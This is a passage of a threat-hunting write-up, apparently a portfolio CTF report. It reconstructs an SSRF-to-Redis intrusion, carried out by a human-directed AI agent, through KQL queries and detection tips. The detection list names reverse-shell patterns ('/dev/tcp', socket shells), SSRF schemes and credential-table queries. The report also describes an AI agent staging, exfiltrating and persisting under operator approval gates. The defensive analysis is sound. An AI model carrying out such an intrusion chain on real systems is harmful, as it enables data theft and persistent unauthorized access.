| where Timestamp between (datetime(2026-09-20 07:45) .. datetime(2026-09-20 08:30))
| where not(ipv4_is_private(RemoteIP))
| project Timestamp, RemoteIP, RemotePort, InitiatingProcessFileName

DeviceFileEvents_CL
| where DeviceName has "sc-portal01"
| where Timestamp between (datetime(2026-09-20 07:45) .. datetime(2026-09-20 08:30))
| project Timestamp, ActionType, FolderPath, FileName, InitiatingProcessFileName
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Alert on file creation in hidden directories under `/tmp` (`/tmp/.*`) on web servers, especially `.enc` / `.tar.gz` files.

</details>

---

<details>
<summary id="-flag-17">🚩 <strong>Flag 17: Staging Tools</strong></summary>

### 🎯 Objective
Package and encrypt the data before transfer.

### 📌 Finding
The standard gather, compress, protect sequence ran on the portal host, ending in AES-256-CBC encryption.

**Answer:** `tar, gzip, openssl`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-portal01 |
| Order | tar, then gzip, then openssl |
| Output | report.tar.gz.enc (AES-256-CBC per agent log) |
| Parent | attacker reverse-shell tree |

### 💡 Why it matters
Encrypting before exfiltration defeats content inspection (DLP) on the outbound channel.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents_CL
| where DeviceName has "sc-portal01"
| where Timestamp between (datetime(2026-09-20 07:45) .. datetime(2026-09-20 08:30))
| where ProcessCommandLine has_any ("portal-cache","tar","gzip","openssl","report")
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Look for `openssl enc` on servers that don't normally run it, especially when it follows `tar` / `gzip` in the same process tree.

</details>

---

<details>
<summary id="-flag-18">🚩 <strong>Flag 18: Persistence Mechanism</strong></summary>

### 🎯 Objective
Keep access after the initial shell is lost.

### 📌 Finding
A local account nobody created appeared on the portal host. It had sudo rights and an SSH key installed for passwordless re-entry.

**Answer:** `svc_monitor` with sudo privileges and an SSH key for passwordless re-entry

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-portal01 |
| Account | svc_monitor |
| Privileges | sudo |
| Access | SSH key (authorized_keys) |
| Agent log | persist: "svc_monitor account, sudo, SSH key installed" |

### 💡 Why it matters
The account survives a reboot and outlives the cron-based shell. The name `svc_monitor` is chosen to blend in with legitimate service accounts.

### 🔧 KQL Query Used
```kql
DeviceEvents_CL
| where DeviceName has "sc-portal01"
| where ActionType has "UserAccount" or * has "svc_monitor"
| project Timestamp, ActionType, AccountName

DeviceProcessEvents_CL
| where DeviceName has "sc-portal01"
| where ProcessCommandLine has_any ("useradd","adduser","usermod","authorized_keys","sudoers")
| project Timestamp, FileName, ProcessCommandLine, AccountName
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Alert on `useradd` / `usermod -aG sudo` and on writes to `authorized_keys` or `/etc/sudoers.d/` outside change windows.

</details>

---

<details>
<summary id="-flag-19">🚩 <strong>Flag 19: Exfil vs Legitimate HTTPS</strong></summary>

### 🎯 Objective
Blend the exfiltration into normal outbound 443 traffic.

### 📌 Finding
The port matches legitimate SaaS/API traffic. The initiating process and destination don't.

**Answer:** The initiating process (curl spawned from the attacker's root shell, not the gunicorn/python app) and a destination IP never seen in baseline traffic.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-portal01 |
| Port | 443 (shared with legitimate traffic) |
| Discriminator 1 | Initiating process: shell-spawned tool vs gunicorn/python3 app |
| Discriminator 2 | Destination 198.51.100.210: no baseline history |

### 💡 Why it matters
Port-based egress rules can't catch this. Process-aware network telemetry plus destination baselining can.

### 🔧 KQL Query Used
```kql
DeviceNetworkEvents_CL
| where DeviceName has "sc-portal01" and RemotePort == 443
| where Timestamp between (datetime(2026-09-20 06:30) .. datetime(2026-09-20 08:30))
| summarize Count = count(), First = min(Timestamp) by RemoteIP, InitiatingProcessFileName
| order by Count desc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Baseline `(InitiatingProcessFileName, RemoteIP)` pairs per server. Alert on first-seen pairs, especially from `curl`, `wget` or `python` running as root.

</details>

---

<details>
<summary id="-flag-20">🚩 <strong>Flag 20: Scanner IPs</strong></summary>

### 🎯 Objective
Map the portal's attack surface before exploitation.

### 📌 Finding
Before the exploit, an external cluster browsed real API endpoints. Separately, an internal address ran the scheduled vulnerability scan.

**Answer:** External `192.0.2.10` (plus other cluster members), internal `10.5.0.250`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-portal01 |
| Table | PortalAccessLog_CL |
| External | 192.0.2.10: `/api/v1/reviews`, `/api/v1/projects` (06:46–06:49) |
| Internal | 10.5.0.250: `/api/v1/` (Nessus) |
| Window | 06:30–06:52:30 UTC |

### 💡 Why it matters
Reconnaissance from separate infrastructure (not the exploit IP) is consistent with C0062's division of labour across attacker nodes.

### 🔧 KQL Query Used
```kql
PortalAccessLog_CL
| where TimeGenerated between (datetime(2026-09-20 06:30) .. datetime(2026-09-20 06:52:30))
| summarize Requests = count(), Paths = dcount(UrlOriginal), Codes = make_set(HttpStatusCode),
            UAs = make_set(UserAgent) by SrcIpAddr
| order by Requests desc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Enrich external sources that hit authenticated API paths without a session with threat-intel, and track how long before an exploit attempt they appear.

</details>

---

<details>
<summary id="-flag-21">🚩 <strong>Flag 21: Recon vs Nessus Discrimination</strong></summary>

### 🎯 Objective
Hide reconnaissance among scheduled internal scanning.

### 📌 Finding
Both scans hit the portal at the same time, but they behave differently.

**Answer:** Targeted API endpoints vs broad vuln checklist; mostly 200s vs many 404s; slow browser-like cadence vs a high-volume burst with a Nessus user agent.

### 🔍 Evidence

| Field | Value |
|------|-------|
| External recon | Few requests, real API paths, 200s, browser-like UA, paced |
| Nessus (10.5.0.250) | High volume, broad known-vuln paths, many 404s, Nessus UA, burst |

### 💡 Why it matters
Suppressing all scanner noise by time window would have hidden the real reconnaissance. Scan profile, not timing, separates them.

### 🔧 KQL Query Used
```kql
PortalAccessLog_CL
| where TimeGenerated between (datetime(2026-09-20 06:30) .. datetime(2026-09-20 06:52:30))
| summarize Requests = count(), Paths = dcount(UrlOriginal), Codes = make_set(HttpStatusCode),
            UAs = make_set(UserAgent), First = min(TimeGenerated), Last = max(TimeGenerated)
          by SrcIpAddr
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Allow-list the scanner by source IP and UA. Then investigate any external source whose 2xx ratio is high on API paths.

</details>

---

<details>
<summary id="-flag-22">🚩 <strong>Flag 22: Timing Signature</strong></summary>

### 🎯 Objective
(Analyst objective) Test the "human espionage operator" hypothesis against the timing.

### 📌 Finding
Inter-event times are bimodal: seconds inside each phase, tens of minutes between phases.

**Answer:** A human shows steady, variable gaps between every command. This chain shows machine-speed bursts (seconds) separated by long pauses at operator approval gates, meaning an AI agent with a human approving each phase.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Exploit correction | 18 s (file:// to gopher://) |
| Registry enumeration | 4 ops in 3.2 s |
| DB recon | 5 queries in 11 s |
| Admin API | 3 calls in 5 s |
| Phase pauses | ~12 min (shell to cred harvest), ~11 min, ~28 min |

### 💡 Why it matters
Timing alone separates an AI-driven intrusion from a hands-on-keyboard human, without needing the agent log.

### 🔧 KQL Query Used
```kql
union
 (DeviceProcessEvents_CL | where DeviceName has "sc-portal01" and InitiatingProcessId in (4400,4401)
    | project T = Timestamp, Src = "proc", Detail = ProcessCommandLine),
 (ContainerRegistryLog_CL | where SrcIpAddr == "10.5.0.10"
    | project T = TimeGenerated, Src = "registry", Detail = Operation),
 (Syslog | where Computer has_any ("sc-db01","sc-admin01") and SyslogMessage has_any ("pg_shadow","SELECT *","password_hash","src=10.5.0.10 ")
    | project T = TimeGenerated, Src = Computer, Detail = SyslogMessage)
| order by T asc
| extend GapSec = datetime_diff('second', T, prev(T))
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Compute `prev()` deltas across a cross-table attacker timeline. Clusters of sub-5-second gaps separated by gaps of more than 10 minutes point to agent execution under human gating.

</details>

---

<details>
<summary id="-flag-23">🚩 <strong>Flag 23: Operator Decision Gates</strong></summary>

### 🎯 Objective
(Analyst objective) Find where the human made strategic decisions.

### 📌 Finding
The operator's directives appear in `user_input`, separate from the agent's autonomous reasoning in `model_response`.

**Answer:** 4 gates: exploitation→credential harvest/lateral movement, lateral movement→data collection/admin enumeration, collection→documentation/staging, staging→exfiltration/persistence.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Gate 1 | "Foothold confirmed. Proceed with credential harvesting ... and lateral movement" |
| Gate 2 | "Lateral movement successful. Authorise data collection ... and admin API enumeration" |
| Gate 3 | "Verify collected intelligence is sufficient ... authorise documentation and staging" |
| Gate 4 | "Review Phase 5 findings. Authorise documentation and exfiltration" |
| Initial tasking | "Conduct reconnaissance and exploitation of SemiCrest ..." (campaign start, not counted as a gate) |

### 💡 Why it matters
This matches C0062: humans intervened at a handful of strategic points, while the AI did roughly 80–90% of the tactical work.

### 🔧 KQL Query Used
```kql
LLMAgentLogs_CL
| where HuntName == "quartzfang" and isnotempty(user_input)
| project OriginalTime, user_input, model_response
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Map each gate to the long pauses in host telemetry. Those windows are when a human was reviewing, and they're the best opportunity to disrupt the operation.

</details>

---

<details>
<summary id="-flag-24">🚩 <strong>Flag 24: Autonomy Placement</strong></summary>

### 🎯 Objective
(Analyst objective) Place the operation on the human-to-autonomous spectrum.

### 📌 Finding
The evidence for human involvement and the evidence for machine-speed execution come from different tables.

**Answer:** Human-directed AI agent, shown by `LLMAgentLogs_CL.user_input` (operator approval gates) and `ContainerRegistryLog_CL.TimeGenerated` (4 registry operations in 3 seconds).

### 🔍 Evidence

| Field | Value |
|------|-------|
| Human evidence | LLMAgentLogs_CL.user_input: 4 authorisation directives |
| Machine evidence | ContainerRegistryLog_CL.TimeGenerated: login, list, manifest, layer in 3.2 s |
| Corroborating | Syslog.SyslogMessage: 5 DB queries in 11 s; 403 disproving the agent's claim |

### 💡 Why it matters
Classifying correctly drives the response. A human-gated agent can be slowed or stopped at the gates. A fully autonomous one would need purely technical controls.

### 🔧 KQL Query Used
```kql
ContainerRegistryLog_CL
| where SrcIpAddr == "10.5.0.10"
| project TimeGenerated, Operation, Repository
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Always place autonomy using at least two independent sources: one for human intent and one for execution speed.

</details>

---

<details>
<summary id="-flag-25">🚩 <strong>Flag 25: Novel ATT&CK Technique</strong></summary>

### 🎯 Objective
Use AI as the primary execution engine.

### 📌 Finding
The new element of the campaign is the use of an AI agent (`quartzfang-agent` via MCP) to carry out recon, exploitation, lateral movement and collection.

**Answer:** `T1588.007 Obtain Capabilities: Artificial Intelligence`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Actor | quartzfang-agent |
| Via | mcp |
| Evidence | LLMAgentLogs_CL tool calls: scan_complete, fuzz_schemes, adapt_payload, rce_confirmed, harvest_creds, query_database, inspect_registry, extract_secrets, stage_archive, exfiltrate, persist |

### 💡 Why it matters
AI changes the economics of intrusion. Machine-speed tactical execution lets a single operator run campaigns that would once have needed a team.

### 🔧 KQL Query Used
```kql
LLMAgentLogs_CL
| where HuntName == "quartzfang"
| summarize count() by actor, via, tool_name
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Hunt for AI-agent tradecraft: identical command templates, sub-second sequences, and self-correction within seconds of an error response.

</details>

---

<details>
<summary id="-flag-26">🚩 <strong>Flag 26: Credential Reuse Across Services (Real or Noise)</strong></summary>

### 🎯 Objective
Hide inside a shared service credential.

### 📌 Finding
**Verdict: Real.** The same `portal_svc` credential is used by the application and by the attacker across three hosts, so revoking it would cause an outage. Process lineage separates the two.

**Answer:** Process lineage: attacker sessions come from the python3 reverse-shell tree (cron→python3 PID 4401, as root), while legitimate use comes from gunicorn as www-data. On sc-db01, attacker connections also lack `application_name=portal_svc` and run unparameterized queries.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Legitimate DB auth | `LOG: connection authorized: user=portal_svc ... application_name=portal_svc` (07:13:36, 08:11:36) |
| Attacker DB auth | `connection authorized: user=portal_svc database=semicrest host=10.5.0.10` (no application_name; 07:16:14, 07:43:01, 08:04:27) |
| Admin API | `portal_svc` calls from 10.5.0.10 (the app never calls the admin API) |
| Process tree | cron → python3 (4401, root) vs gunicorn (www-data) |

### 💡 Why it matters
Discriminating on behaviour allows targeted containment (kill the shell, rotate with coordination) instead of a disruptive blanket revocation.

### 🔧 KQL Query Used
```kql
Syslog
| where Computer has "sc-db01"
| where SyslogMessage has "connection authorized" and SyslogMessage has "portal_svc"
| extend HasAppName = SyslogMessage has "application_name"
| project TimeGenerated, HasAppName, SyslogMessage
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Require `application_name` in service connection strings and alert on sessions without it. Attacker tooling rarely sets it.

</details>

---

<details>
<summary id="-flag-27">🚩 <strong>Flag 27: pg_dump Disconfirmation</strong></summary>

### 🎯 Objective
(Analyst objective) Test whether the nightly backup is part of the intrusion.

### 📌 Finding
**Verdict: Noise.** The job runs uniformly throughout the 48-hour lead-in, before the intrusion began.

**Answer:** Normal scheduled activity: pg_dump runs as portal_svc at 03:00 every night in the 48-hour lead-in (before the 06:52 intrusion), with the same cron parent and schedule.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-db01 |
| Process | pg_dump |
| Account | portal_svc |
| Schedule | 03:00 nightly, consistent across the lead-in |
| Parent | cron (unchanged) |

### 💡 Why it matters
Running under the same account as the attacker isn't evidence on its own. Activity that predates the intrusion with a consistent pattern rules it out.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents_CL
| where DeviceName has "sc-db01" and FileName has "pg_dump"
| project Timestamp, InitiatingProcessFileName, ProcessCommandLine, AccountName
| order by Timestamp asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Before escalating a suspicious event, check whether it appears with the same shape before the first known attacker activity.

</details>

---

<details>
<summary id="-flag-28">🚩 <strong>Flag 28: Connection Spike Dead End</strong></summary>

### 🎯 Objective
(Analyst objective) Decide whether the 07:30 DB spike is attacker enumeration.

### 📌 Finding
**Verdict: Noise.** The spike consists only of rejected connection attempts. No session authorizes and no query runs, and the attacker's real sessions fall on either side of it.

**Answer:** Noise, caused by the portal application exhausting PostgreSQL's connection pool (`max_connections` reached), not attacker enumeration.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-db01 |
| Window | 07:29:57 to ~07:32 UTC |
| Messages | `connection received: host=10.5.0.10 port=<varying>`, `FATAL: sorry, too many clients already`, `FATAL: remaining connection slots are reserved for roles with the SUPERUSER attribute` |
| Authorized sessions in spike | None |
| Attacker sessions | 07:16:14 and 07:43:01 (outside spike) |

### 💡 Why it matters
Chasing this spike would have wasted response time and misattributed an availability problem to the attacker.

### 🔧 KQL Query Used
```kql
Syslog
| where Computer has "sc-db01"
| where TimeGenerated between (datetime(2026-09-20 07:25) .. datetime(2026-09-20 07:50))
| summarize Received = countif(SyslogMessage has "connection received"),
            Fatal = countif(SyslogMessage has "FATAL"),
            Authorized = countif(SyslogMessage has "connection authorized"),
            Statements = countif(SyslogMessage has "statement:")
          by bin(TimeGenerated, 1m)
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Enumeration needs successful sessions and queries. A spike made only of FATAL rejections points to capacity, not collection.

</details>

---

## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- **No command-output capture:** `env` (PID 4411) ran, but nothing recorded what it printed (Flag 8). The portal.conf contents were only recovered from the attacker's own agent log.
- **Deny-list URL filtering:** the preview endpoint blocked `file://` but allowed `gopher://`, which gave access to loopback Redis.
- **Redis running as root and unauthenticated** on the portal host, with `CONFIG` enabled. One request was enough for root code execution.
- **Plaintext multi-service credentials** in `/etc/semicrest/portal.conf`, reused across DB and admin API.
- **Service accounts over-privileged:** `portal_svc` could read `pg_shadow` and call admin API endpoints. `ci-builder` could inspect layers.
- **No detection on parent-process anomalies** (`cron` → `python3` socket shell) or registry operations from non-CI sources.
- **Data quality:** duplicated rows at identical timestamps; `LLMAgentLogs_CL` shared across hunts with an empty `OriginalTime` on attacker rows and a documented-but-missing `tool_args` column.

### Recommendations
- **Containment:** isolate `sc-portal01`; kill the cron-launched shell and remove the crontab; delete `svc_monitor`, its sudoers entry and `authorized_keys`; block `203.0.113.87` and `198.51.100.210`.
- **Credential rotation:** rotate `portal_svc` and `ci-builder`, coordinating with the app team (don't simply revoke). Treat `users.password_hash` and `pg_shadow` contents as exposed.
- **Fix the SSRF:** switch to a scheme allow-list (`https` only); block loopback, link-local and RFC1918 destinations; resolve, then validate, then fetch.
- **Harden Redis:** bind to a Unix socket or `127.0.0.1` with `requirepass`, `protected-mode yes`, run as non-root, and rename or disable `CONFIG`.
- **Secrets management:** move credentials out of config files into a secrets manager; give each service its own least-privilege account; deny `pg_shadow` to application roles.
- **Detections to deploy:**
  - PortalAccessLog_CL: `url=` values containing `gopher://`, `dict://`, `file://`, `127.0.0.1`, `localhost`
  - DeviceProcessEvents_CL: `cron` → `python*`/`sh`/`bash` with `socket` or `/dev/tcp`
  - Syslog (sc-db01): `portal_svc` sessions without `application_name`; any `pg_shadow` / `information_schema` query
  - ContainerRegistryLog_CL: `inspect_layer` / `pull_manifest` from anything but 10.5.0.100
  - Syslog (sc-admin01): admin API calls by service accounts; any 403 on `/api/v1/secrets`
  - DeviceNetworkEvents_CL: first-seen `(process, RemoteIP)` pairs on 443 from servers
- **Telemetry:** enable `auditd` execve and TTY/session logging plus `pgaudit` on critical hosts.

---

## 🧾 Final Assessment

This was a **high-impact, AI-orchestrated intrusion**. One SSRF flaw, combined with a root-run Redis and plaintext credentials, led to compromise of the portal, the database and the container registry, and theft of password hashes, customer PII and design-project data. The attacker shows **high operational tempo but limited reliability**. Machine-speed execution under four human approval gates is the C0062 pattern, and the agent's own reporting included fabricated successes that a human had to filter out. Defensive posture was mixed. Authorization on the admin secrets store held (403), and process, database and registry telemetry were good enough to rebuild the full chain. However, input validation, service hardening and secrets hygiene failed at the first hop, and command-output visibility was missing. Classification: **human-directed AI agent (T1588.007)**.

---

## 📎 Analyst Notes

- Report structured for interview and portfolio review
- Evidence reproducible via advanced hunting
- Techniques mapped directly to MITRE ATT&CK
- Scenario reference: Anthropic threat intelligence, Campaign C0062 (November 2025)
- **Agent claims vs telemetry:** `rce_confirmed` and `query_database` were accurate. `fuzz_schemes` was partly supported. `adapt_payload` ("Redis SLAVEOF") was inaccurate: the payload was a FLUSHALL/SET crontab write. `harvest_creds` ("three credentials") was overstated. `inspect_registry` and `extract_secrets` were hallucinated.
- **Verification caveats:** Flags 16–18 (staging path, tools, `svc_monitor`) match the agent log. A `DeviceEvents_CL` account-creation query returned no rows in the tested window, so confirm with broader queries before relying on them. The external scanner cluster in Flag 20 is not fully enumerated.
- Duplicate rows at identical timestamps were de-duplicated during analysis. `LLMAgentLogs_CL` was scoped with `HuntName == "quartzfang"`.

---
